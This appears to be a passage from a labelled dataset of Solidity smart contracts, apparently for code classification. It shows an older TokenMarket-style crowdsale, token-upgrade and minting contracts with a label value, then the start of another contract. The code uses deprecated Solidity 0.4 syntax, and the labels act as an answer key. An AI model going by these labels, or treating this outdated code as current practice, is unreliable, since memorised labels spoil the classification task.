0);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer and clear his address.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\r\r\n    investWithSignedAddress(msg.sender, customerId, v, r, s);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Invest to tokens, recognize the payer.\r\r\n   *\r\r\n   *\/\r\r\n  function buyWithCustomerId(uint128 customerId) public payable {\r\r\n    investWithCustomerId(msg.sender, customerId);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * The basic entry point to participate the crowdsale process.\r\r\n   *\r\r\n   * Pay for funding, get invested tokens back in the sender address.\r\r\n   *\/\r\r\n  function buy() public payable {\r\r\n    invest(msg.sender);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Finalize a succcesful crowdsale.\r\r\n   *\r\r\n   * The owner can triggre a call the contract that provides post-crowdsale actions, like releasing the tokens.\r\r\n   *\/\r\r\n  function finalize() public inState(State.Success) onlyOwner stopInEmergency {\r\r\n\r\r\n    \/\/ Already finalized\r\r\n    if(finalized) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Finalizing is optional. We only call it if we are given a finalizing agent.\r\r\n    if(address(finalizeAgent) != 0) {\r\r\n      finalizeAgent.finalizeCrowdsale();\r\r\n    }\r\r\n\r\r\n    finalized = true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set finalize agent.\r\r\n   *\r\r\n   * Design choice: no state restrictions on setting this, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\r\r\n    finalizeAgent = addr;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!finalizeAgent.isFinalizeAgent()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy do we need to have server-side customer ids for the investments.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireCustomerId(bool value) onlyOwner {\r\r\n    requireCustomerId = value;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set policy if all investors must be cleared on the server side first.\r\r\n   *\r\r\n   * This is e.g. for the accredited investor clearing.\r\r\n   *\r\r\n   *\/\r\r\n  function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\r\r\n    requiredSignedAddress = value;\r\r\n    signerAddress = _signerAddress;\r\r\n    InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow addresses to do early participation.\r\r\n   *\r\r\n   * TODO: Fix spelling error in the name\r\r\n   *\/\r\r\n  function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\r\r\n    earlyParticipantWhitelist[addr] = status;\r\r\n    Whitelisted(addr, status);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow crowdsale owner to close early or extend the crowdsale.\r\r\n   *\r\r\n   * This is useful e.g. for a manual soft cap implementation:\r\r\n   * - after X amount is reached determine manual closing\r\r\n   *\r\r\n   * This may put the crowdsale to an invalid state,\r\r\n   * but we trust owners know what they are doing.\r\r\n   *\r\r\n   *\/\r\r\n  function setEndsAt(uint time) onlyOwner {\r\r\n\r\r\n    if(now > time) {\r\r\n      throw; \/\/ Don&#39;t change past\r\r\n    }\r\r\n\r\r\n    endsAt = time;\r\r\n    EndsAtChanged(endsAt);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to (re)set pricing strategy.\r\r\n   *\r\r\n   * Design choice: no state restrictions on the set, so that we can fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\r\r\n    pricingStrategy = _pricingStrategy;\r\r\n\r\r\n    \/\/ Don&#39;t allow setting bad agent\r\r\n    if(!pricingStrategy.isPricingStrategy()) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to change the team multisig address in the case of emergency.\r\r\n   *\r\r\n   * This allows to save a deployed crowdsale wallet in the case the crowdsale has not yet begun\r\r\n   * (we have done only few test transactions). After the crowdsale is going\r\r\n   * then multisig address stays locked for the safety reasons.\r\r\n   *\/\r\r\n  function setMultisig(address addr) public onlyOwner {\r\r\n\r\r\n    \/\/ Change\r\r\n    if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    multisigWallet = addr;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow load refunds back on the contract for the refunding.\r\r\n   *\r\r\n   * The team can transfer the funds back on the smart contract in the case the minimum goal was not reached..\r\r\n   *\/\r\r\n  function loadRefund() public payable inState(State.Failure) {\r\r\n    if(msg.value == 0) throw;\r\r\n    loadedRefund = loadedRefund.plus(msg.value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Investors can claim refund.\r\r\n   *\r\r\n   * Note that any refunds from proxy buyers should be handled separately,\r\r\n   * and not through this contract.\r\r\n   *\/\r\r\n  function refund() public inState(State.Refunding) {\r\r\n    uint256 weiValue = investedAmountOf[msg.sender];\r\r\n    if (weiValue == 0) throw;\r\r\n    investedAmountOf[msg.sender] = 0;\r\r\n    weiRefunded = weiRefunded.plus(weiValue);\r\r\n    Refund(msg.sender, weiValue);\r\r\n    if (!msg.sender.send(weiValue)) throw;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @return true if the crowdsale has raised enough money to be a successful.\r\r\n   *\/\r\r\n  function isMinimumGoalReached() public constant returns (bool reached) {\r\r\n    return weiRaised >= minimumFundingGoal;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isFinalizerSane() public constant returns (bool sane) {\r\r\n    return finalizeAgent.isSane();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Check if the contract relationship looks good.\r\r\n   *\/\r\r\n  function isPricingSane() public constant returns (bool sane) {\r\r\n    return pricingStrategy.isSane(address(this));\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Crowdfund state machine management.\r\r\n   *\r\r\n   * We make it a function and do not assign the result to a variable, so there is no chance of the variable being stale.\r\r\n   *\/\r\r\n  function getState() public constant returns (State) {\r\r\n    if(finalized) return State.Finalized;\r\r\n    else if (address(finalizeAgent) == 0) return State.Preparing;\r\r\n    else if (!finalizeAgent.isSane()) return State.Preparing;\r\r\n    else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\r\r\n    else if (block.timestamp < startsAt) return State.PreFunding;\r\r\n    else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\r\r\n    else if (isMinimumGoalReached()) return State.Success;\r\r\n    else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\r\r\n    else return State.Failure;\r\r\n  }\r\r\n\r\r\n  \/** This is for manual testing of multisig wallet interaction *\/\r\r\n  function setOwnerTestValue(uint val) onlyOwner {\r\r\n    ownerTestValue = val;\r\r\n  }\r\r\n\r\r\n  \/** Interface marker. *\/\r\r\n  function isCrowdsale() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Modifiers\r\r\n  \/\/\r\r\n\r\r\n  \/** Modified allowing execution only if the crowdsale is currently running.  *\/\r\r\n  modifier inState(State state) {\r\r\n    if(getState() != state) throw;\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/\/\r\r\n  \/\/ Abstract functions\r\r\n  \/\/\r\r\n\r\r\n  \/**\r\r\n   * Check if the current invested breaks our cap rules.\r\r\n   *\r\r\n   *\r\r\n   * The child contract must define their own cap setting rules.\r\r\n   * We allow a lot of flexibility through different capping strategies (ETH, token count)\r\r\n   * Called from invest().\r\r\n   *\r\r\n   * @param weiAmount The amount of wei the investor tries to invest in the current transaction\r\r\n   * @param tokenAmount The amount of tokens we try to give to the investor in the current transaction\r\r\n   * @param weiRaisedTotal What would be our total raised balance after this transaction\r\r\n   * @param tokensSoldTotal What would be our total sold tokens count after this transaction\r\r\n   *\r\r\n   * @return true if taking this investment would break our cap rules\r\r\n   *\/\r\r\n  function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\r\r\n\r\r\n  \/**\r\r\n   * Check if the current crowdsale is full and we can no longer sell any tokens.\r\r\n   *\/\r\r\n  function isCrowdsaleFull() public constant returns (bool);\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens or transfer issued tokens to the investor depending on the cap model.\r\r\n   *\/\r\r\n  function assignTokens(address receiver, uint tokenAmount) private;\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\ncontract SafeMath {\r\r\n  function safeMul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeDiv(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeSub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\r\r\n *\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, SafeMath {\r\r\n\r\r\n  \/* Token supply got increased and a new owner received these tokens *\/\r\r\n  event Minted(address receiver, uint amount);\r\r\n\r\r\n  \/* Actual balances of token holders *\/\r\r\n  mapping(address => uint) balances;\r\r\n\r\r\n  \/* approve() allowances *\/\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  \/* Interface declaration *\/\r\r\n  function isToken() public constant returns (bool weAre) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    uint _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    balances[_from] = safeSub(balances[_from], _value);\r\r\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Upgrade agent interface inspired by Lunyr.\r\r\n *\r\r\n * Upgrade agent transfers tokens to a new contract.\r\r\n * Upgrade agent itself can be the token contract, or just a middle man contract doing the heavy lifting.\r\r\n *\/\r\r\ncontract UpgradeAgent {\r\r\n\r\r\n  uint public originalSupply;\r\r\n\r\r\n  \/** Interface marker *\/\r\r\n  function isUpgradeAgent() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function upgradeFrom(address _from, uint256 _value) public;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token upgrade mechanism where users can opt-in amount of tokens to the next smart contract revision.\r\r\n *\r\r\n * First envisioned by Golem and Lunyr projects.\r\r\n *\/\r\r\ncontract UpgradeableToken is StandardToken {\r\r\n\r\r\n  \/** Contract \/ person who can set the upgrade path. This can be the same as team multisig wallet, as what it is with its default value. *\/\r\r\n  address public upgradeMaster;\r\r\n\r\r\n  \/** The next contract where the tokens will be migrated. *\/\r\r\n  UpgradeAgent public upgradeAgent;\r\r\n\r\r\n  \/** How many tokens we have upgraded by now. *\/\r\r\n  uint256 public totalUpgraded;\r\r\n\r\r\n  \/**\r\r\n   * Upgrade states.\r\r\n   *\r\r\n   * - NotAllowed: The child contract has not reached a condition where the upgrade can bgun\r\r\n   * - WaitingForAgent: Token allows upgrade, but we don&#39;t have a new agent yet\r\r\n   * - ReadyToUpgrade: The agent is set, but not a single token has been upgraded yet\r\r\n   * - Upgrading: Upgrade agent is set and the balance holders can upgrade their tokens\r\r\n   *\r\r\n   *\/\r\r\n  enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\r\r\n\r\r\n  \/**\r\r\n   * Somebody has upgraded some of his tokens.\r\r\n   *\/\r\r\n  event Upgrade(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n  \/**\r\r\n   * New upgrade agent available.\r\r\n   *\/\r\r\n  event UpgradeAgentSet(address agent);\r\r\n\r\r\n  \/**\r\r\n   * Do not allow construction without upgrade master set.\r\r\n   *\/\r\r\n  function UpgradeableToken(address _upgradeMaster) {\r\r\n    upgradeMaster = _upgradeMaster;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow the token holder to upgrade some of their tokens to a new contract.\r\r\n   *\/\r\r\n  function upgrade(uint256 value) public {\r\r\n\r\r\n      UpgradeState state = getUpgradeState();\r\r\n      if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\r\r\n        \/\/ Called in a bad state\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      \/\/ Validate input value.\r\r\n      if (value == 0) throw;\r\r\n\r\r\n      balances[msg.sender] = safeSub(balances[msg.sender], value);\r\r\n\r\r\n      \/\/ Take tokens out from circulation\r\r\n      totalSupply = safeSub(totalSupply, value);\r\r\n      totalUpgraded = safeAdd(totalUpgraded, value);\r\r\n\r\r\n      \/\/ Upgrade agent reissues the tokens\r\r\n      upgradeAgent.upgradeFrom(msg.sender, value);\r\r\n      Upgrade(msg.sender, upgradeAgent, value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set an upgrade agent that handles\r\r\n   *\/\r\r\n  function setUpgradeAgent(address agent) external {\r\r\n\r\r\n      if(!canUpgrade()) {\r\r\n        \/\/ The token is not yet in a state that we could think upgrading\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      if (agent == 0x0) throw;\r\r\n      \/\/ Only a master can designate the next agent\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      \/\/ Upgrade has already begun for an agent\r\r\n      if (getUpgradeState() == UpgradeState.Upgrading) throw;\r\r\n\r\r\n      upgradeAgent = UpgradeAgent(agent);\r\r\n\r\r\n      \/\/ Bad interface\r\r\n      if(!upgradeAgent.isUpgradeAgent()) throw;\r\r\n      \/\/ Make sure that token supplies match in source and target\r\r\n      if (upgradeAgent.originalSupply() != totalSupply) throw;\r\r\n\r\r\n      UpgradeAgentSet(upgradeAgent);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the state of the token upgrade.\r\r\n   *\/\r\r\n  function getUpgradeState() public constant returns(UpgradeState) {\r\r\n    if(!canUpgrade()) return UpgradeState.NotAllowed;\r\r\n    else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\r\r\n    else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\r\r\n    else return UpgradeState.Upgrading;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Change the upgrade master.\r\r\n   *\r\r\n   * This allows us to set a new owner for the upgrade mechanism.\r\r\n   *\/\r\r\n  function setUpgradeMaster(address master) public {\r\r\n      if (master == 0x0) throw;\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      upgradeMaster = master;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Child contract can enable to provide the condition when the upgrade can begun.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n     return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Define interface for releasing the token transfer after a successful crowdsale.\r\r\n *\/\r\r\ncontract ReleasableToken is ERC20, Ownable {\r\r\n\r\r\n  \/* The finalizer contract that allows unlift the transfer limits on this token *\/\r\r\n  address public releaseAgent;\r\r\n\r\r\n  \/** A crowdsale contract can release us to the wild if ICO success. If false we are are in transfer lock up period.*\/\r\r\n  bool public released = false;\r\r\n\r\r\n  \/** Map of agents that are allowed to transfer tokens regardless of the lock down period. These are crowdsale contracts and possible the team multisig itself. *\/\r\r\n  mapping (address => bool) public transferAgents;\r\r\n\r\r\n  \/**\r\r\n   * Limit token transfer until the crowdsale is over.\r\r\n   *\r\r\n   *\/\r\r\n  modifier canTransfer(address _sender) {\r\r\n\r\r\n    if(!released) {\r\r\n        if(!transferAgents[_sender]) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set the contract that can call release and make the token transferable.\r\r\n   *\r\r\n   * Design choice. Allow reset the release agent to fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\r\r\n\r\r\n    \/\/ We don&#39;t do interface check here as we might want to a normal wallet address to act as a release agent\r\r\n    releaseAgent = addr;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a particular address (a crowdsale contract) to transfer tokens despite the lock up period.\r\r\n   *\/\r\r\n  function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\r\r\n    transferAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * One way function to release the tokens to the wild.\r\r\n   *\r\r\n   * Can be called only from the release agent that is the final ICO contract. It is only called if the crowdsale has been success (first milestone reached).\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    released = true;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only before or after the tokens have been releasesd *\/\r\r\n  modifier inReleaseState(bool releaseState) {\r\r\n    if(releaseState != released) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only by a whitelisted release agent. *\/\r\r\n  modifier onlyReleaseAgent() {\r\r\n    if(msg.sender != releaseAgent) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transfer()\r\r\n   return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transferForm()\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that can increase its supply by another contract.\r\r\n *\r\r\n * This allows uncapped crowdsale by dynamically increasing the supply when money pours in.\r\r\n * Only mint agents, contracts whitelisted by owner, can mint new tokens.\r\r\n *\r\r\n *\/\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  \/** List of agents that are allowed to create new tokens *\/\r\r\n  mapping (address => bool) public mintAgents;\r\r\n\r\r\n  event MintingAgentChanged(address addr, bool state  );\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens and allocate them to an address..\r\r\n   *\r\r\n   * Only callably by a crowdsale contract (mint agent).\r\r\n   *\/\r\r\n  function mint(address receiver, uint amount) onlyMintAgent canMint public {\r\r\n    totalSupply = totalSupply.plus(amount);\r\r\n    balances[receiver] = balances[receiver].plus(amount);\r\r\n\r\r\n    \/\/ This will make the mint transaction apper in EtherScan.io\r\r\n    \/\/ We can remove this after there is a standardized minting event\r\r\n    Transfer(0, receiver, amount);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a crowdsale contract to mint new tokens.\r\r\n   *\/\r\r\n  function setMintAgent(address addr, bool state) onlyOwner canMint public {\r\r\n    mintAgents[addr] = state;\r\r\n    MintingAgentChanged(addr, state);\r\r\n  }\r\r\n\r\r\n  modifier onlyMintAgent() {\r\r\n    \/\/ Only crowdsale contracts are allowed to mint new tokens\r\r\n    if(!mintAgents[msg.sender]) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** Make sure we are not done yet. *\/\r\r\n  modifier canMint() {\r\r\n    if(mintingFinished) throw;\r\r\n    _;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A crowdsaled token.\r\r\n *\r\r\n * An ERC-20 token designed specifically for crowdsales with investor protection and further development path.\r\r\n *\r\r\n * - The token transfer() is disabled until the crowdsale is over\r\r\n * - The token contract gives an opt-in upgrade path to a new contract\r\r\n * - The same token can be part of several crowdsales through approve() mechanism\r\r\n * - The token can be capped (supply set in the constructor) or uncapped (crowdsale contract can mint new tokens)\r\r\n *\r\r\n *\/\r\r\ncontract CrowdsaleToken is ReleasableToken, MintableToken, UpgradeableToken {\r\r\n\r\r\n  \/** Name and symbol were updated. *\/\r\r\n  event UpdatedTokenInformation(string newName, string newSymbol);\r\r\n\r\r\n  string public name;\r\r\n\r\r\n  string public symbol;\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n  \/**\r\r\n   * Construct the token.\r\r\n   *\r\r\n   * This token must be created through a team multisig wallet, so that it is owned by that wallet.\r\r\n   *\r\r\n   * @param _name Token name\r\r\n   * @param _symbol Token symbol - should be all caps\r\r\n   * @param _initialSupply How many tokens we start with\r\r\n   * @param _decimals Number of decimal places\r\r\n   * @param _mintable Are new tokens created over the crowdsale or do we distribute only the initial supply? Note that when the token becomes transferable the minting always ends.\r\r\n   *\/\r\r\n  function CrowdsaleToken(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable)\r\r\n    UpgradeableToken(msg.sender) {\r\r\n\r\r\n    \/\/ Create any address, can be transferred\r\r\n    \/\/ to team multisig via changeOwner(),\r\r\n    \/\/ also remember to call setUpgradeMaster()\r\r\n    owner = msg.sender;\r\r\n\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    totalSupply = _initialSupply;\r\r\n\r\r\n    decimals = _decimals;\r\r\n\r\r\n    \/\/ Create initially all balance on the team multisig\r\r\n    balances[owner] = totalSupply;\r\r\n\r\r\n    if(totalSupply > 0) {\r\r\n      Minted(owner, totalSupply);\r\r\n    }\r\r\n\r\r\n    \/\/ No more new supply allowed after the token creation\r\r\n    if(!_mintable) {\r\r\n      mintingFinished = true;\r\r\n      if(totalSupply == 0) {\r\r\n        throw; \/\/ Cannot create a token without supply and no minting\r\r\n      }\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When token is released to be transferable, enforce no new tokens can be created.\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    mintingFinished = true;\r\r\n    super.releaseTokenTransfer();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow upgrade agent functionality kick in only if the crowdsale was success.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n    return released && super.canUpgrade();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can update token information here.\r\r\n   *\r\r\n   * It is often useful to conceal the actual token association, until\r\r\n   * the token operations, like central issuance or reissuance have been completed.\r\r\n   *\r\r\n   * This function allows the token owner to rename the token after the operations\r\r\n   * have been completed and then point the audience to use the token contract.\r\r\n   *\/\r\r\n  function setTokenInformation(string _name, string _symbol) onlyOwner {\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    UpdatedTokenInformation(name, symbol);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * At the end of the successful crowdsale allocate % bonus of tokens to the team.\r\r\n *\r\r\n * Unlock tokens.\r\r\n *\r\r\n * BonusAllocationFinal must be set as the minting agent for the MintableToken.\r\r\n *\r\r\n *\/\r\r\ncontract BonusFinalizeAgent is FinalizeAgent {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  CrowdsaleToken public token;\r\r\n  Crowdsale public crowdsale;\r\r\n\r\r\n  \/** Total percent of tokens minted to the team at the end of the sale as base points (0.0001) *\/\r\r\n  uint public bonusBasePoints;\r\r\n\r\r\n  \/** Where we move the tokens at the end of the sale. *\/\r\r\n  address public teamMultisig;\r\r\n\r\r\n  \/* How much bonus tokens we allocated *\/\r\r\n  uint public allocatedBonus;\r\r\n\r\r\n  function BonusFinalizeAgent(CrowdsaleToken _token, Crowdsale _crowdsale, uint _bonusBasePoints, address _teamMultisig) {\r\r\n    token = _token;\r\r\n    crowdsale = _crowdsale;\r\r\n    if(address(crowdsale) == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    teamMultisig = _teamMultisig;\r\r\n    if(address(teamMultisig) == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    bonusBasePoints = _bonusBasePoints;\r\r\n  }\r\r\n\r\r\n  \/* Can we run finalize properly *\/\r\r\n  function isSane() public constant returns (bool) {\r\r\n    return (token.mintAgents(address(this)) == true) && (token.releaseAgent() == address(this));\r\r\n  }\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale() {\r\r\n    if(msg.sender != address(crowdsale)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ How many % of tokens the founders and others get\r\r\n    uint tokensSold = crowdsale.tokensSold();\r\r\n    allocatedBonus = tokensSold.times(bonusBasePoints) \/ 10000;\r\r\n\r\r\n    \/\/ move tokens to the team multisig wallet\r\r\n    token.mint(teamMultisig, allocatedBonus);\r\r\n\r\r\n    \/\/ Make token transferable\r\r\n    token.releaseTokenTransfer();\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  